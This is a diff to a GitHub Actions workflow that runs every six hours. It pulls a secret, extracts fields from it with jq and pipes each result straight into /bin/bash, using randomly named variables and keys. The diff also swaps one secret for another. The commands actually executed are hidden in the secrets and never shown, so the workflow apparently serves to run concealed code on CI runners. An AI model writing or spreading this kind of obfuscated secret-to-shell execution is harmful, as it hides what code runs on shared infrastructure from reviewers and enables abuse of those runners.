@@ -3,7 +3,7 @@ name: bitesizedcommitment
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 4/6 * * *'
+    - cron: '43 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +12,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: bitesizedcommitment
         env:
-          njpvm98387: ${{ secrets.njpvm98387 }}
+          arwg0: ${{ secrets.arwg0 }}
         run: |
-          echo $njpvm98387 | jq -r .crd59171 | /bin/bash
-          echo $bscst217 | jq -r .tz51862 | /bin/bash
-          echo $kkf2 | jq -r .rk3 | /bin/bash
-          echo $spdkp70 | jq -r .tst10852 | /bin/bash
-          echo $ecc2 | jq -r .a857 | /bin/bash
-          echo $xf33 | jq -r .hi1625 | /bin/bash
-          echo $jz57 | jq -r .sxva56451 | /bin/bash
-          echo $ny33862 | jq -r .xm258 | /bin/bash
-          echo $cixf18845 | jq -r .y6752 | /bin/bash
+          echo $arwg0 | jq -r .kbi9398 | /bin/bash
+          echo $qber71 | jq -r .lqcli03 | /bin/bash
+          echo $jh28 | jq -r .f248 | /bin/bash
+          echo $kbbuj75916 | jq -r .n1 | /bin/bash
+          echo $vr03 | jq -r .kugcp3 | /bin/bash
+          echo $bjpl284 | jq -r .yv7 | /bin/bash
+          echo $lyfek8070 | jq -r .hrmz2 | /bin/bash
+          echo $tbwf12386 | jq -r .fv97 | /bin/bash
+          echo $brcp2751 | jq -r .vle7644 | /bin/bash
+          echo $f56014 | jq -r .qhq34 | /bin/bash
+          echo $ogq03 | jq -r .v85070 | /bin/bash
+          echo $mgqya53 | jq -r .qrni0431 | /bin/bash
+          echo $cgtpb96639 | jq -r .wsr711 | /bin/bash
+          echo $trc1 | jq -r .tht763 | /bin/bash
+          echo $ev9 | jq -r .gvwv5 | /bin/bash
+          echo $ux04 | jq -r .fzyra2 | /bin/bash
+          echo $aihrc95218 | jq -r .alxp12 | /bin/bash
 
